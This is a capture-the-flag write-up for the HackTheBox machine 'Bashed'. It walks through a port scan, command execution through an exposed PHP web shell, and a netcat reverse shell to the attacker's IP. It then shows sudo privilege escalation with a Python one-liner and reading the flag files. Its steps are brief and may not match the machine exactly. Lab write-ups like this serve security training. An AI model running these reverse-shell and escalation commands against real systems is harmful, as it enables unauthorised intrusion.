# HackTheBox - Bashed

## Challenge Information

| Field | Value |
|-------|-------|
| **Platform** | HackTheBox |
| **Challenge Name** | Bashed |
| **Category** | Linux Exploitation |
| **Difficulty** | Easy |
| **Points** | 20 |
| **Author** | ch4p |
| **Date Completed** | 2025-08-24 |

## Objective 🎯

Bashed is a Linux machine with a web application that has a command execution vulnerability. The goal is to exploit the vulnerability to gain system access and obtain both user and root flags. Command injection time! 💻

## Initial Reconnaissance

### Target Information
- **IP Address**: 10.10.10.68
- **OS**: Linux
- **Service**: Web Application

### Tools Used
- Nmap
- Web browser
- Command injection

### Commands/Steps
```bash
nmap -sC -sV 10.10.10.68
```

## Methodology

### Step 1: Port Scan
```bash
nmap -sC -sV 10.10.10.68
```

### Step 2: Web Application Enumeration
```bash
curl http://10.10.10.68/
```

### Step 3: Command Injection
```bash
curl "http://10.10.10.68/dev/phpbash.php?cmd=id"
```

### Step 4: Reverse Shell
```bash
curl "http://10.10.10.68/dev/phpbash.php?cmd=nc -e /bin/bash 10.10.14.2 4444"
```

### Step 5: Privilege Escalation
```bash
sudo -l
sudo /usr/bin/python3 -c "import os; os.system('/bin/bash')"
```

### Step 6: Find Flags
```bash
cat /home/scriptmanager/user.txt
cat /root/root.txt
```

## Solution

### Final Answer
- **User Flag**: [REDACTED]
- **Root Flag**: [REDACTED]

## Key Learnings

- Web application command injection
- PHP web shell exploitation
- Python privilege escalation
- Linux system exploitation

## Tags

`#hackthebox` `#linux` `#command-injection` `#php` `#python` `#easy`
